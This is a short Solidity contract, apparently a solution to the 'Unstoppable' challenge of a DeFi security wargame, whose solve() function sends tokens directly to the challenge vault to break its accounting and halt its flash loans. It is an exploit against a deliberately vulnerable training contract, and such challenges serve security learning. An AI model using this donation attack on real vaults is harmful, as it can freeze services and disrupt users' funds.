pragma solidity =0.8.25;
import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";
import {SafeTransferLib, ERC4626, ERC20} from "solmate/tokens/ERC4626.sol";

contract UnstoppableAttacker {

    UnstoppableVault public vault;
    address public token;

    constructor(UnstoppableVault _vault,address _token){
        vault = _vault;
        token = _token;

    }

    function solve() external {
        ERC20(token).transfer(address(vault),10);
    }
}